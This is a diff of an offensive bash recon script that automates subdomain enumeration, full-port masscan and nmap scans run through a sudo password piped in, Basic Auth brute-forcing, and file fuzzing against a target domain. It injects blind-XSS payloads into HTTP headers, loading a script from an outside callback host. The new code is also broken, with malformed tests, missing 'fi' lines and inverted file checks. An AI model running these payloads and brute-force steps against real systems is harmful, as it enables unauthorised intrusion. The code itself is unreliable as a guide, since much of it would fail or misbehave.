@@ -14,11 +14,12 @@ xss_hunter=$(cat ~/tools/.creds | grep 'xss_hunter' | awk {'print $3'})
 [ ! -f ~/recon/$1/virtual-hosts ] && mkdir ~/recon/$1/virtual-hosts
 [ ! -f ~/recon/$1/endpoints ] && mkdir ~/recon/$1/endpoints
 [ ! -f ~/recon/$1/github-endpoints ] && mkdir ~/recon/$1/github-endpoints
-[ ! -f ~/recon/$1/otxurls ] && mkdir ~/recon/$1/otxurls
-[ ! -f ~/recon/$1/waybackurls ] && mkdir ~/recon/$1/waybackurls
+[ ! -f ~/recon/$1/gau ] && mkdir ~/recon/$1/gau
 [ ! -f ~/recon/$1/http-desync ] && mkdir ~/recon/$1/http-desync
 [ ! -f ~/recon/$1/401 ] && mkdir ~/recon/$1/401
 sleep 5
+
+folder=$1
 
 message () {
 	telegram_bot=$(cat ~/tools/.creds | grep "telegram_bot" | awk {'print $3'})
@@ -36,123 +37,80 @@ date
 
 [ ! -f ~/tools/nameservers.txt ] && wget https://public-dns.info/nameservers.txt -O ~/tools/nameservers.txt
 
-echo "[+] AMASS SCANNING [+]"
-if [ ! -f ~/recon/$1/$1-amass.txt ] && [ ! -z $(which amass) ]; then
-	amass enum -passive -rf ~/tools/nameservers.txt -d $1 -o ~/recon/$1/$1-amass.txt
-	amasscan=`scanned ~/recon/$1/$1-amass.txt`
-	message "Amass%20Found%20$amasscan%20subdomain(s)%20for%20$1"
-	echo "[+] Amass Found $amasscan subdomains"
-else
-	message "[-]%20Skipping%20Amass%20Scanning%20for%20$1"
-	echo "[!] Skipping ..."
+if [! -f ~/recon/$1/$1-final.txt ]; then
+	echo "[+] AMASS SCANNING [+]"
+	if [ ! -f ~/recon/$1/$1-amass.txt ] && [ ! -z $(which amass) ]; then
+		amass enum -passive -rf ~/tools/nameservers.txt -d $1 -o ~/recon/$1/$1-amass.txt
+		amasscan=`scanned ~/recon/$1/$1-amass.txt`
+		message "Amass%20Found%20$amasscan%20subdomain(s)%20for%20$1"
+		echo "[+] Amass Found $amasscan subdomains"
+	else
+		message "[-]%20Skipping%20Amass%20Scanning%20for%20$1"
+		echo "[!] Skipping ..."
+	fi
+	sleep 5
+
+	echo "[+] FINDOMAIN SCANNING [+]"
+	if [ ! -f ~/recon/$1/$1-findomain.txt ] && [ ! -z $(which findomain) ]; then
+		findomain -t $1 -q -u ~/recon/$1/$1-findomain.txt
+		findomainscan=`scanned ~/recon/$1/$1-findomain.txt`
+		message "Findomain%20Found%20$findomainscan%20subdomain(s)%20for%20$1"
+		echo "[+] Findomain Found $findomainscan subdomains"
+	else
+		message "[-]%20Skipping%20Findomain%20$findomainscan%20previously%20discovered%20for%20$1"
+		echo "[!] Skipping ..."
+	fi
+	sleep 5
+
+	echo "[+] SUBFINDER SCANNING [+]"
+	if [ ! -f ~/recon/$1/$1-subfinder.txt ] && [ ! -z $(which subfinder) ]; then
+		subfinder -d $1 -nW -silent -o ~/recon/$1/$1-subfinder.txt
+		subfinderscan=`scanned ~/recon/$1/$1-subfinder.txt`
+		message "SubFinder%20Found%20$subfinderscan%20subdomain(s)%20for%20$1"
+		echo "[+] Subfinder Found $subfinderscan subdomains"
+	else
+		message "[-]%20Skipping%20Subfinder%20Scanning%20for%20$1"
+		echo "[!] Skipping ..."
+	fi
+	sleep 5
+
+	echo "[+] ASSETFINDER SCANNING [+]"
+	if [ ! -f ~/recon/$1/$1-assetfinder.txt ] && [ ! -z $(which assetfinder) ]; then
+		assetfinder -subs-only $1 > ~/recon/$1/$1-assetfinder.txt
+		assetfinderscan=`scanned ~/recon/$1/$1-assetfinder.txt`
+		message "Assetfinder%20Found%20$assetfinderscan%20subdomain(s)%20for%20$1"
+		echo "[+] Assetfinder Found $assetfinderscan subdomains"
+	else
+		message "[-]%20Skipping%20Assetfinder%20Scanning%20for%20$1"
+		echo "[!] Skipping ..."
+	fi
+	sleep 5
+
+	echo "[+] SCANNING SUBDOMAINS WITH PROJECT SONAR [+]"
+	if [ ! -f ~/recon/$1/$1-project-sonar.txt ] && [ -e ~/tools/forward_dns.json.gz ]; then
+		pv ~/tools/forward_dns.json.gz | zcat | grep -E "\.$1\"," | jq -r '.name' | sort -u >> ~/recon/$1/$1-project-sonar.txt
+		projectsonar=`scanned ~/recon/$1/$1-project-sonar.txt`
+		message "Project%20Sonar%20Found%20$projectsonar%20subdomain(s)%20for%20$1"
+		echo "[+] Project Sonar Found $projectsonar subdomains"
+	else
+		message "[-]%20Skipping%20Project%20Sonar%20Scanning%20for%20$1"
+		echo "[!] Skipping ..."
+	fi
+	sleep 5
+
+	## Deleting all the results to less disk usage
+	cat ~/recon/$1/$1-amass.txt ~/recon/$1/$1-project-sonar.txt ~/recon/$1/$1-findomain.txt ~/recon/$1/$1-subfinder.txt ~/recon/$1/$1-assetfinder.txt | sort -uf > ~/recon/$1/$1-final.txt
+	rm ~/recon/$1/$1-amass.txt ~/recon/$1/$1-project-sonar.txt ~/recon/$1/$1-findomain.txt ~/recon/$1/$1-subfinder.txt ~/recon/$1/$1-assetfinder.txt
+	touch ~/recon/$1/$1-ipz.txt
+	sleep 5
+
 fi
-sleep 5
-
-echo "[+] FINDOMAIN SCANNING [+]"
-if [ ! -f ~/recon/$1/$1-findomain.txt ] && [ ! -z $(which findomain) ]; then
-	findomain -t $1 -q -u ~/recon/$1/$1-findomain.txt
-	findomainscan=`scanned ~/recon/$1/$1-findomain.txt`
-	message "Findomain%20Found%20$findomainscan%20subdomain(s)%20for%20$1"
-	echo "[+] Findomain Found $findomainscan subdomains"
-else
-	message "[-]%20Skipping%20Findomain%20$findomainscan%20previously%20discovered%20for%20$1"
-	echo "[!] Skipping ..."
-fi
-sleep 5
-
-echo "[+] SUBFINDER SCANNING [+]"
-if [ ! -f ~/recon/$1/$1-subfinder.txt ] && [ ! -z $(which subfinder) ]; then
-	subfinder -d $1 -nW -silent -o ~/recon/$1/$1-subfinder.txt
-	subfinderscan=`scanned ~/recon/$1/$1-subfinder.txt`
-	message "SubFinder%20Found%20$subfinderscan%20subdomain(s)%20for%20$1"
-	echo "[+] Subfinder Found $subfinderscan subdomains"
-else
-	message "[-]%20Skipping%20Subfinder%20Scanning%20for%20$1"
-	echo "[!] Skipping ..."
-fi
-sleep 5
-
-echo "[+] AQUATONE SCANNING [+]"
-if [ ! -f ~/aquatone/$1/urls.txt ] && [ ! -z $(which aquatone-discover) ] && [ ! -z $(which aquatone-scan) ]; then
-	aquatone-discover -d $1
-	aquatone-scan -d $1 -p huge
-	for domains in `cat ~/aquatone/$1/urls.txt`; do domain="${domains#*://}"; domainx="${domain%/*}"; domainz="${domainx%:*}"; echo $domainz | sort -u >> ~/recon/$1/$1-aquatone.txt;done
-	aquatonescan=`scanned ~/recon/$1/$1-aquatone.txt`
-	message "Aquatone%20Found%20$aquatonescan%20subdomain(s)%20for%20$1"
-	echo "[+] Aquatone Found $aquatonescan subdomains"
-else
-	for domains in `cat ~/aquatone/$1/urls.txt`; do domain="${domains#*://}"; domainx="${domain%/*}"; domainz="${domainx%:*}"; echo $domainz | sort -u >> ~/recon/$1/$1-aquatone.txt;done
-	aquatonescan=`scanned ~/recon/$1/$1-aquatone.txt`
-	message "[-]%20Skipping%20Aquatone%20Scanning%20for%20$1"
-	echo "[!] Skipping ..."
-fi
-sleep 5
-
-echo "[+] ASSETFINDER SCANNING [+]"
-if [ ! -f ~/recon/$1/$1-assetfinder.txt ] && [ ! -z $(which assetfinder) ]; then
-	assetfinder -subs-only $1 > ~/recon/$1/$1-assetfinder.txt
-	assetfinderscan=`scanned ~/recon/$1/$1-assetfinder.txt`
-	message "Assetfinder%20Found%20$assetfinderscan%20subdomain(s)%20for%20$1"
-	echo "[+] Assetfinder Found $assetfinderscan subdomains"
-else
-	message "[-]%20Skipping%20Assetfinder%20Scanning%20for%20$1"
-	echo "[!] Skipping ..."
-fi
-sleep 5
-
-echo "[+] SCANNING SUBDOMAINS WITH PROJECT SONAR [+]"
-if [ ! -f ~/recon/$1/$1-project-sonar.txt ] && [ -e ~/tools/forward_dns.json.gz ]; then
-	pv ~/tools/forward_dns.json.gz | pigz -dc | grep -E "*[.]$1\"," | jq -r '.name' | sort -u >> ~/recon/$1/$1-project-sonar.txt
-	projectsonar=`scanned ~/recon/$1/$1-project-sonar.txt`
-	message "Project%20Sonar%20Found%20$projectsonar%20subdomain(s)%20for%20$1"
-	echo "[+] Project Sonar Found $projectsonar subdomains"
-else
-	message "[-]%20Skipping%20Project%20Sonar%20Scanning%20for%20$1"
-	echo "[!] Skipping ..."
-fi
-sleep 5
-
-echo "[+] GOBUSTER SCANNING [+]"
-if [ ! -f ~/recon/$1/$1-gobuster.txt ] && [ ! -z $(which gobuster) ]; then
-	[ ! -f ~/tools/all.txt ] && wget "https://gist.githubusercontent.com/jhaddix/86a06c5dc309d08580a018c66354a056/raw/96f4e51d96b2203f19f6381c8c545b278eaa0837/all.txt" -O ~/tools/all.txt
-	gobuster dns -d $1 -t 100 -w ~/tools/all.txt --wildcard -o ~/recon/$1/$1-gobust.txt
-	cat ~/recon/$1/$1-gobust.txt | grep "Found:" | awk {'print $2'} > ~/recon/$1/$1-gobuster.txt
-	rm ~/recon/$1/$1-gobust.txt
-	gobusterscan=`scanned ~/recon/$1/$1-gobuster.txt`
-	message "Gobuster%20Found%20$gobusterscan%20subdomain(s)%20for%20$1"
-	echo "[+] Gobuster Found $gobusterscan subdomains"
-else
-	message "[-]%20Skipping%20Gobuster%20Scanning%20for%20$1"
-	echo "[!] Skipping ..."		
-fi
-sleep 5
-
-
-echo "[+] CRT.SH SCANNING [+]"
-if [ ! -f ~/recon/$1/$1-crt.txt ]; then
-	for crt in `cat ~/recon/$1/$1-gobuster.txt ~/recon/$1/$1-project-sonar.txt ~/recon/$1/$1-assetfinder.txt ~/recon/$1/$1-aquatone.txt ~/recon/$1/$1-subfinder.txt ~/recon/$1/$1-findomain.txt ~/recon/$1/$1-amass.txt | sort -u`; do
-		crtsh=$(curl "https://crt.sh/?q=%25.$crt&output=json" --silent | jq '.[]|.name_value' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u)
-		for target in $crtsh; do curl "https://crt.sh/?q=%25.$target&output=json" --silent | jq '.[]|.name_value' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u >> ~/recon/$1/$1-crt.txt; done
-	done	
-	crt=`scanned ~/recon/$1/$1-crt.txt`
-	message "CRT.SH%20Found%20$crt%20subdomain(s)%20for%20$1"
-	echo "[+] CRT.sh Found $crt subdomains"
-else
-	message "[-]%20Skipping%20CRT.SH%20Scanning%20for%20$1"
-	echo "[!] Skipping ..."
-fi
-sleep 5
-
-## Deleting all the results to less disk usage
-cat ~/recon/$1/$1-amass.txt ~/recon/$1/$1-project-sonar.txt ~/recon/$1/$1-findomain.txt ~/recon/$1/$1-subfinder.txt ~/recon/$1/$1-aquatone.txt ~/recon/$1/$1-assetfinder.txt ~/recon/$1/$1-crt.txt ~/recon/$1/$1-gobuster.txt | sort -uf > ~/recon/$1/$1-final.txt
-rm ~/recon/$1/$1-amass.txt ~/recon/$1/$1-project-sonar.txt ~/recon/$1/$1-findomain.txt ~/recon/$1/$1-subfinder.txt ~/recon/$1/$1-aquatone.txt ~/recon/$1/$1-assetfinder.txt ~/recon/$1/$1-crt.txt ~/recon/$1/$1-gobuster.txt
-touch ~/recon/$1/$1-ipz.txt
-sleep 5
 
 echo "[+] DNSGEN & TOK SUBDOMAIN PERMUTATION [+]"
 if [ ! -f ~/recon/$1/$1-dnsgen.txt ] && [ ! -z $(which dnsgen) ] && [ ! -z $(which tok) ]; then
-	cat ~/recon/$1/$1-final.txt | sed 's/\.$//g' | tok | sort -u > ~/recon/$1/$1-final.tmp
-	dnsgen ~/recon/$1/$1-final.txt -w ~/recon/$1/$1-final.tmp | massdns -r ~/tools/nameservers.txt -o J --flush 2>/dev/null | jq -r .query_name | sort -u | tee -a ~/recon/$1/$1-dnsgen.tmp
+	[ ! -f ~/tools/all.txt ] && wget "https://gist.githubusercontent.com/jhaddix/86a06c5dc309d08580a018c66354a056/raw/96f4e51d96b2203f19f6381c8c545b278eaa0837/all.txt" -O ~/tools/all.txt
+	cat ~/tools/all.txt ~/recon/$1/$1-final.txt | sed 's/\.$//g' | tok | sort -u > ~/recon/$1/$1-final.tmp
+	dnsgen ~/recon/$1/$1-final.txt --wordlist ~/recon/$1/$1-final.tmp | massdns -r ~/tools/nameservers.txt -o J --flush 2>/dev/null | jq -r .query_name | sort -u | tee -a ~/recon/$1/$1-dnsgen.tmp
 	cat ~/recon/$1/$1-dnsgen.tmp | sed 's/-\.//g' | sed 's/-\.//g' | sed 's/-\-\-\-//g' | sed 's/\.$//g' | sort -u > ~/recon/$1/$1-dnsgen.txt
 	dnsgens=`scanned ~/recon/$1/$1-dnsgen.txt`
 	message "DNSGEN%20generates%20$dnsgens%20subdomain(s)%20for%20$1"
@@ -224,7 +182,7 @@ sleep 5
 
 echo "[+] MASSCAN PORT SCANNING [+]"
 if [ ! -f ~/recon/$1/$1-masscan.txt ] && [ ! -z $(which masscan) ]; then
-	echo $passwordx | sudo -S masscan -p0-65535 -iL ~/recon/$1/$1-ip.txt --max-rate 10000 -oG ~/recon/$1/$1-masscan.txt
+	echo $passwordx | sudo -S masscan -p0-65535 -iL ~/recon/$1/$1-ip.txt --max-rate 1000 -oG ~/recon/$1/$1-masscan.txt
 	mass=`scanned ~/recon/$1/$1-ip.txt`
 	message "Masscan%20Scanned%20$mass%20IPs%20for%20$1"
 	echo "[+] Done masscan for scanning IPs"
@@ -294,23 +252,27 @@ fi
 sleep 5
 
 echo "[+] COLLECTING ENDPOINTS [+]"
-for urlz in `cat ~/recon/$1/$1-httprobe.txt`; do 
-	filename=`echo $urlz | sed 's/http:\/\///g' | sed 's/https:\/\//ssl-/g'`
-	link=$(python ~/tools/LinkFinder/linkfinder.py -i $urlz -d -o cli | grep -E "*.js$" | grep "$1" | grep "Running against:" |awk {'print $3'})
-	if [[ ! -z $link ]]; then
-		for linx in $link; do
-			python3 ~/tools/LinkFinder/linkfinder.py -i $linx -o cli > ~/recon/$1/endpoints/$filename-result.txt
-		done
-	else
-		python ~/tools/LinkFinder/linkfinder.py -i $urlz -d -o cli > ~/recon/$1/endpoints/$filename-result.txt
-	fi
-done
-message "Done%20collecting%20endpoint%20in%20$1"
-echo "[+] Done collecting endpoint"
+if [ ! -f ~/tools/LinkFinder/linkfinder.py ]; then
+	for urlz in `cat ~/recon/$1/$1-httprobe.txt`; do 
+		filename=`echo $urlz | sed 's/http:\/\///g' | sed 's/https:\/\//ssl-/g'`
+		link=$(python ~/tools/LinkFinder/linkfinder.py -i $urlz -d -o cli | grep -E "*.js$" | grep "$1" | grep "Running against:" |awk {'print $3'})
+		if [[ ! -z $link ]]; then
+			for linx in $link; do
+				python ~/tools/LinkFinder/linkfinder.py -i $linx -o cli > ~/recon/$1/endpoints/$filename-result.txt
+			done
+		else
+			python ~/tools/LinkFinder/linkfinder.py -i $urlz -d -o cli > ~/recon/$1/endpoints/$filename-result.txt
+		fi
+	done
+	message "Done%20collecting%20endpoint%20in%20$1"
+	echo "[+] Done collecting endpoint"
+else
+	message "[-]%20Skipping%20linkfinder%20Scanning%20for%20$1"
+	echo "[!] Skipping ..."
 sleep 5
 
 echo "[+] COLLECTING ENDPOINTS FROM GITHUB [+]"
-if [ ! -z $(cat ~/tools/.tokens) ] && [ -e ~/tools/.tokens ]; then
+if [ ! -z $(cat ~/tools/.tokens) ] && [ ! -f ~/tools/.tokens ] && [ ! -f ~/tools/github-endpoints.py ]; then
 	for url in `cat ~/recon/$1/$1-httprobe.txt | sed 's/http\(.?*\)*:\/\///g' | sort -u`; do 
 		python3 ~/tools/github-endpoints.py -d $url -s -r -t $(cat ~/tools/.tokens) > ~/recon/$1/github-endpoints/$url.txt
 		sleep 5
@@ -336,10 +298,14 @@ else
 fi
 sleep 5
 
-echo "[+] MASSDNS SCANNING [+]"
-massdns -r ~/tools/nameservers.txt ~/recon/$1/$1-alive.txt -o S > ~/recon/$1/$1-massdns.txt
-message "Done%20Massdns%20Scanning%20for%20$1"
-echo "[+] Done massdns for scanning assets"
+echo "[+] ZDNS SCANNING [+]"
+if [ ! -z $(which zdns) ]; then
+	for i in $(cat ~/recon/$1/$1-alive.txt);do echo $i | zdns ANY -output-file - | jq -r '"Name: "+.name+"\t\t Protocol: "+.data.protocol+"\t Resolver: "+.data.resolver+"\t Status: "+.status' >> ~/recon/$1/$1-zdns.txt;done
+	message "Done%20ZDNS%20Scanning%20for%20$1"
+	echo "[+] Done massdns for scanning assets"
+else
+	message "Skipping%20scanning%20of%20ZDNS%20in%20$1"
+	echo "[!] Skipping ..."	
 sleep 5
 
 echo "[+] SHODAN HOST SCANNING [+]"
@@ -367,7 +333,7 @@ sleep 5
 echo "[+] NMAP PORT SCANNING [+]"
 if [ ! -f ~/recon/$1/$1-nmap.txt ] && [ ! -z $(which nmap) ]; then
 	[ ! -f ~/tools/nmap-bootstrap.xsl ] && wget "https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl" -O ~/tools/nmap-bootstrap.xsl
-	echo $passwordx | sudo -S nmap -sSVC -A -O -Pn -p$big_ports -iL ~/recon/$1/$1-ip.txt --script http-enum,http-title --data-length=50 --stylesheet ~/tools/nmap-bootstrap.xsl -oA ~/recon/$1/$1-nmap
+	echo $passwordx | sudo -S nmap -sSVC -A -O -Pn -p$big_ports -iL ~/recon/$1/$1-ip.txt --script http-enum,http-title --stylesheet ~/tools/nmap-bootstrap.xsl -oA ~/recon/$1/$1-nmap
 	nmaps=`scanned ~/recon/$1/$1-ip.txt`
 	xsltproc -o ~/recon/$1/$1-nmap.html ~/tools/nmap-bootstrap.xsl ~/recon/$1/$1-nmap.xml
 	message "Nmap%20Scanned%20$nmaps%20IPs%20for%20$1"
@@ -383,7 +349,8 @@ if [ ! -z $(which webanalyze) ]; then
 	[ ! -f ~/tools/apps.json ] && wget "https://raw.githubusercontent.com/AliasIO/Wappalyzer/master/src/apps.json" -O ~/tools/apps.json
 	for target in `cat ~/recon/$1/$1-httprobe.txt`; do
 		filename=`echo $target | sed 's/http\(.?*\)*:\/\///g'`
-		webanalyze -host $target -apps ~/tools/apps.json -output json | jq > ~/recon/$1/webanalyze/$filename.txt
+		webanalyze -host $target -apps ~/tools/apps.json -output csv > ~/recon/$1/webanalyze/$filename.txt
+		sleep 3
 	done
 	message "Done%20webanalyze%20for%20fingerprinting%20$1"
 	echo "[+] Done webanalyze for fingerprinting the assets!"
@@ -393,20 +360,16 @@ else
 fi
 sleep 5
 
-echo "[+] OTXURL Scanning for Archived Endpoints [+]"
-for u in `cat ~/recon/$1/$1-httprobe.txt | sed 's/http\(.?*\)*:\/\///g' | sort -u`;do echo $u | otxurls | grep "$u" >> ~/recon/$1/otxurls/tmp-$u.txt; done
-cat ~/recon/$1/otxurls/* | sort -u | get-title >> ~/recon/$1/otxurls/$1-otxurl.txt 
-rm ~/recon/$1/otxurls/tmp-*
-message "OTXURL%20Done%20for%20$1"
-echo "[+] Done otxurls for discovering useful endpoints"
-sleep 5
-
-echo "[+] WAYBACKURLS Scanning for Archived Endpoints [+]"
-for u in `cat ~/recon/$1/$1-httprobe.txt | sed 's/http\(.?*\)*:\/\///g' | sort -u`;do echo $u | waybackurls | grep "$u" >> ~/recon/$1/waybackurls/tmp-$u.txt; done
-cat ~/recon/$1/waybackurls/* | sort -u | get-title >> ~/recon/$1/waybackurls/$1-waybackurls.txt 
-rm ~/recon/$1/waybackurls/tmp-*
-message "WAYBACKURLS%20Done%20for%20$1"
-echo "[+] Done waybackurls for discovering useful endpoints"
+echo "[+] ALIENVAULT, WAYBACKURLS and COMMON CRAWL Scanning for Archived Endpoints [+]"
+if [ ! -z $(which gau) ]; then
+	for u in `cat ~/recon/$1/$1-httprobe.txt | sed 's/http\(.?*\)*:\/\///g' | sort -u`;do echo $u | gau | grep "$u" >> ~/recon/$1/gau/tmp-$u.txt; done
+	cat ~/recon/$1/gau/* | sort -u | getching >> ~/recon/$1/gau/$1-gau.txt 
+	rm ~/recon/$1/gau/tmp-*
+	message "GAU%20Done%20for%20$1"
+	echo "[+] Done gau for discovering useful endpoints"
+else
+	message "[-]%20Skipping%20GAU%20for%20fingerprinting%20$1"
+	echo "[!] Skipping ..."
 sleep 5
 
 echo "[+] Scanning for Virtual Hosts Resolution [+]"
@@ -414,7 +377,7 @@ if [ ! -z $(which ffuf) ]; then
 	[ ! -f ~/tools/virtual-host-scanning.txt ] && wget "https://raw.githubusercontent.com/codingo/VHostScan/master/VHostScan/wordlists/virtual-host-scanning.txt" -O ~/tools/virtual-host-scanning.txt
 	cat ~/recon/$1/$1-open-ports.txt ~/recon/$1/$1-final.txt ~/recon/$1/$1-dnsgen.tmp ~/recon/$1/$1-final.tmp ~/recon/$1/$1-diff.txt ~/tools/virtual-host-scanning.txt | sed "s/\%s/$1/g" | sort -u >> ~/recon/$1/$1-temp-vhost-wordlist.txt
 	path=$(pwd)
-	ffuf -c -w "$path/recon/$1/$1-temp-vhost-wordlist.txt:HOSTS" -w "$path/recon/$1/$1-alive.txt:TARGETS" -u http://TARGETS -k -r -H "Host: HOSTS" -H "X-Forwarded-For: TARGETS.xforwarded.$dns_server" -H "X-Real-IP: TARGETS.xrealip.$dns_server" -H "X-Originating-IP: TARGETS.xoriginatingip.$dns_server" -H "Client-IP: TARGETS.clientip.$dns_server" -H "CF-Connecting_IP: TARGETS.cfconnectingip.$dns_server" -H "Forwarded: for=TARGETS.for-forwarded.$dns_server;by=TARGETS.by-forwarded.$dns_server;host=TARGETS.host-forwarded.$dns_server" -H "X-Client-IP: TARGETS.xclientip.$dns_server" -H "True-Client-IP: TARGETS.trueclientip.$dns_server" -H "X-Forwarded-Host: TARGETS.xforwardedhost.$dns_server" -H "User-Agent: '\">blahblah<script src='$xss_hunter'></script>testing" -mc all -fc 500-599 -of html -o ~/recon/$1/virtual-hosts/$1.html
+	ffuf -c -w "$path/recon/$1/$1-temp-vhost-wordlist.txt:HOSTS" -w "$path/recon/$1/$1-alive.txt:TARGETS" -u http://TARGETS -k -r -H "Host: HOSTS" -H "X-Forwarded-For: TARGETS.xforwarded.$dns_server" -H "X-Real-IP: TARGETS.xrealip.$dns_server" -H "X-Originating-IP: TARGETS.xoriginatingip.$dns_server" -H "Client-IP: TARGETS.clientip.$dns_server" -H "CF-Connecting_IP: TARGETS.cfconnectingip.$dns_server" -H "Forwarded: for=TARGETS.for-forwarded.$dns_server;by=TARGETS.by-forwarded.$dns_server;host=TARGETS.host-forwarded.$dns_server" -H "X-Client-IP: TARGETS.xclientip.$dns_server" -H "True-Client-IP: TARGETS.trueclientip.$dns_server" -H "X-Forwarded-Host: TARGETS.xforwardedhost.$dns_server" -H "Referer: $xss_hunter/TARGETS/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -H "User-Agent: %22%27%3Eblahblah%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2Fscript%3Etesting" -mc all -fc 500-599 -of html -o ~/recon/$1/virtual-hosts/TARGETS.html
 	message "Virtual%20Host%20done%20for%20$1"
 	rm ~/recon/$1/$1-dnsgen.tmp ~/recon/$1/$1-final.tmp ~/recon/$1/$1-diff.txt
 	echo "[+] Done ffuf for scanning virtual hosts"
@@ -427,39 +390,32 @@ sleep 5
 
 echo "[+] 401 Scanning"
 [ ! -f ~/tools/basic_auth.txt ] && wget https://raw.githubusercontent.com/phspade/Combined-Wordlists/master/basic_auth.txt -O ~/tools/basic_auth.txt
-for i in `cat ~/recon/$1/$1-httprobe.txt`; do
-	filename=`echo $i | sed 's/http:\/\///g' | sed 's/https:\/\//ssl-/g'`
-	stat_code=$(curl -s -o /dev/null -w "%{http_code}" "$i" --max-time 10)
-	if [ 401 == $stat_code ]; then
-		ffuf -c -w ~/tools/basic_auth.txt -u $i -k -r -H "Authorization: Basic FUZZ" -mc all -fc 500-599,401 -of html -o ~/recon/$1/401/$filename-basic-auth.html 
-	else
-		echo "$stat_code >> $i"
-	fi
-done
-echo "[+] Done 401 Scanning for $1"
-sleep 5
-
-echo "[+] DirSearch Scanning for Sensitive Files [+]"
-sub_count=$(cat ~/recon/$1/$1-httprobe.txt | wc -l)
-if (( $sub_count <= 100 )); then
-	cat ~/recon/$1/$1-httprobe.txt | sort -u | xargs -P10 -I % sh -c "filename=$(echo % | sed 's/http:\/\///g' | sed 's/https:\/\//ssl-/g'); python3 ~/dirsearch/dirsearch.py -u % -e php,bak,txt,asp,aspx,jsp,html,zip,jar,sql,json,old,gz,shtml,log,swp,yaml,yml,config,save,rsa,ppk -x 400,404,301,401,500,406,503,502 -t 100 -H \"User-Agent: %22\\\"&quot;'>blahblah<script src='$xss_hunter'></script>testing\" -b --plain-text-report ~/recon/$1/dirsearch/$filename-dirsearch.txt"
+if [ ! -z $(which ffuf) ]; then
+	for i in `cat ~/recon/$1/$1-httprobe.txt`; do
+		filename=`echo $i | sed 's/http:\/\///g' | sed 's/https:\/\//ssl-/g'`
+		stat_code=$(curl -s -o /dev/null -w "%{http_code}" "$i" --max-time 10)
+		if [ 401 == $stat_code ]; then
+			ffuf -c -w ~/tools/basic_auth.txt -u $i -k -r -H "Authorization: Basic FUZZ" -mc all -fc 500-599,401 -of html -o ~/recon/$1/401/$filename-basic-auth.html 
+		else
+			echo "$stat_code >> $i"
+		fi
+	done
+	message "401%20Scan%20Done%20for%20$1"
+	echo "[+] Done 401 Scanning for $1"
 else
-	cat ~/recon/$1/$1-httprobe.txt | sort -u | head -100 | xargs -P10 -I % sh -c "filename=$(echo % | sed 's/http:\/\///g' | sed 's/https:\/\//ssl-/g'); python3 ~/dirsearch/dirsearch.py -u % -e php,bak,txt,asp,aspx,jsp,html,zip,jar,sql,json,old,gz,shtml,log,swp,yaml,yml,config,save,rsa,ppk -x 400,404,301,401,500,406,503,502 -t 100 -H \"User-Agent: %22\\\"&quot;'>blahblah<script src='$xss_hunter'></script>testing\" -b --plain-text-report ~/recon/$1/dirsearch/$filename-dirsearch.txt"
-fi
-echo "[+] Done dirsearch for file and directory scanning"
+	message "[-]%20Skipping%20ffuf%20for%20401%20scanning"
+	echo "[!] Skipping ..."
 sleep 5
 
-# echo "[+] DEFAULT CREDENTIAL SCANNING [+]"
-# if [ -e ~/tools/changeme/changeme.py ] && [ "active" == `systemctl is-active redis` ]; then
-# 	for targets in `cat ~/recon/$1/$1-open-ports.txt`;do python3 ~/tools/changeme/changeme.py --redishost redis --all --threads 20 --portoverride $targets -d --fresh -v --ssl --timeout 25 -o ~/recon/$1/default-credential/$targets-changeme.csv; done
-# 	message "Default%20Credential%20done%20for%20$1"
-# 	echo "[+] Done changeme for scanning default credentials"
-# 	for process in `ps aux | grep changeme | awk {'print $2'}`; do kill -9 $process > /dev/null; done
-# else
-# 	message "[-]%20Skipping%20Default%20Credential%20Scanning%20for%20$1"
-# 	echo "[!] Skipping ..."
-# fi
-# sleep 5
+echo "[+] Dir and Files Scanning for Sensitive Files [+]"
+if [ ! -z $(which ffuf) ]; then
+	for f in $(cat ~/recon/$1/$1-httprobe.txt); do file=$(echo $f | sed 's/http\(.?*\)*:\/\///g'); ffuf -c -D -w ~/tools/dicc.txt -ic -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $f/FUZZ -fc 500-599,404,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -o ~/recon/$1/dirsearch/$file.html; done
+	message "Dir%20and%20files%20Scan%20Done%20for%20$1"
+	echo "[+] Done ffuf for file and directory scanning"
+else
+	message "[-]%20Skipping%20ffuf%20for%20dir%20and%20files%20scanning"
+	echo "[!] Skipping ..."
+sleep 5
 
 [ ! -f ~/$1.out ] && mv ~/$1.out ~/recon/$1/ 
 message "Scanner%20Done%20for%20$1"
